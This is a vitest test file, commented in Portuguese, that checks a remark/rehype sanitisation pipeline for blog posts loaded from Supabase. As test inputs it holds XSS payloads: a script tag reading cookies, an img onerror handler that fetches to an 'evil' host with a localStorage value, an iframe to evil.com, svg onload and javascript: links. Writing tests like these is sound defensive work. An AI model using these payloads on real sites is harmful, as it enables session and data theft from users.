import { describe, it, expect } from "vitest";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";

/**
 * Protege a cadeia de saneamento usada em App.tsx para renderizar o conteúdo
 * dos posts, que vem do Supabase (fonte remota, tratada como não confiável).
 *
 * A ORDEM dos plugins é a segurança: rehypeRaw transforma o HTML bruto em nós
 * do AST e rehypeSanitize sanea esse AST em seguida. A implementação anterior
 * rodava DOMPurify sobre a string markdown ANTES da conversão, o que inverte o
 * pipeline. Se alguém reintroduzir aquele padrão, ou remover o rehypeSanitize,
 * estes testes falham.
 */
const pipeline = unified()
  .use(remarkParse)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize);

interface Achados {
  tags: string[];
  attrs: string[];
  jsUrls: string[];
}

function analisar(node: any, acc: Achados = { tags: [], attrs: [], jsUrls: [] }): Achados {
  if (node.type === "element") {
    acc.tags.push(node.tagName);
    for (const [attr, valor] of Object.entries(node.properties || {})) {
      acc.attrs.push(attr);
      if (typeof valor === "string" && /^javascript:/i.test(valor)) acc.jsUrls.push(valor);
    }
  }
  (node.children || []).forEach((filho: any) => analisar(filho, acc));
  return acc;
}

async function renderizar(markdown: string): Promise<Achados> {
  const tree = await pipeline.run(pipeline.parse(markdown));
  return analisar(tree);
}

describe("saneamento do markdown dos posts", () => {
  it("remove tags <script>", async () => {
    const r = await renderizar("<script>alert(document.cookie)</script>");
    expect(r.tags).not.toContain("script");
  });

  it("remove handlers de evento inline mantendo a tag legítima", async () => {
    const r = await renderizar('<img src=x onerror="fetch(\'//evil/\'+localStorage.getItem(\'k\'))">');
    expect(r.tags).toContain("img");
    expect(r.attrs.filter(a => /^on/i.test(a))).toHaveLength(0);
  });

  it("remove <iframe>, <object> e <embed>", async () => {
    const r = await renderizar('<iframe src="//evil.com"></iframe><object data="x"></object><embed src="x">');
    expect(r.tags).not.toContain("iframe");
    expect(r.tags).not.toContain("object");
    expect(r.tags).not.toContain("embed");
  });

  it("remove <svg> com onload", async () => {
    const r = await renderizar('<svg onload="alert(1)"></svg>');
    expect(r.tags).not.toContain("svg");
    expect(r.attrs.filter(a => /^on/i.test(a))).toHaveLength(0);
  });

  it("neutraliza URLs javascript: em links", async () => {
    const r = await renderizar("[clique](javascript:alert(1))");
    expect(r.jsUrls).toHaveLength(0);
  });

  it("preserva o HTML benigno de posts legados (h2/p/strong)", async () => {
    // O post-1773878706307, da era Gemini, foi escrito inteiramente em HTML.
    const r = await renderizar("<h2>Problema Real</h2>\n<p>Texto com <strong>negrito</strong>.</p>");
    expect(r.tags).toContain("h2");
    expect(r.tags).toContain("p");
    expect(r.tags).toContain("strong");
  });

  it("preserva markdown normal (headings, ênfase, código)", async () => {
    const r = await renderizar("## Seção\n\nTexto **negrito** e `código`.");
    expect(r.tags).toContain("h2");
    expect(r.tags).toContain("strong");
    expect(r.tags).toContain("code");
  });
});
